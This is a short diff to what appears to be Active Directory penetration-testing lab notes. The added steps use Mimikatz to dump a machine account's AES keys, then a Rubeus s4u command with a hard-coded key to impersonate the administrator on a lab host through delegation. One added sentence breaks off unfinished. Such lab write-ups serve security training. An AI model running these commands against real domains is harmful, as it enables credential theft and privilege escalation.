@@ -495,9 +495,26 @@ $comps = 'dcorp-student1$','dcorp-student2$' Set-ADComputer -Identity dcorp-mgmt
 ```
 
 
-- Now, let's get the privileges of `dcorp-studentx`$ by extracting its AES keys:
+- Now, let's get the privileges of `dcorp-studentx$` by extracting its AES keys:
 
 
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+
+
+![](https://i.imgur.com/d6NEWHh.png)
+
+
+> **Note -:** With the above command we wanna extract the AES key for 
+
+
+- Use the AES key of `dcorp-studentx$` with Rubeus and access dcorp-mgmt as ANY user we want:
+
+```powershell
+Rubeus.exe s4u /user:dcorp-student1$
+/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
+83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt
+/impersonateuser:administrator /ptt
 ```
